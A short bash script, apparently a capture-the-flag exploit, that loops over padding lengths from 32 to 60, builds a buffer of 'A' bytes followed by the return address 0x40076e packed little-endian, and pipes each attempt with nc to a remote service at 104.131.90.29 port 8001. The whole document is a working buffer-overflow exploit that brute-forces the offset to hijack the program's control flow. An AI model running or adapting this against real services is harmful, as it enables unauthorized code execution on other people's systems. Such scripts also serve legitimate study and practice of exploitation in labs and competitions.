# we want to ship to address 40076e
# \x6e\x07\x40\x00



for i in {32..60}
do
	echo "Doing $i"
	python -c "print '\x41'*$i + '\x6e\x07\x40\x00' " | nc 104.131.90.29 8001
done
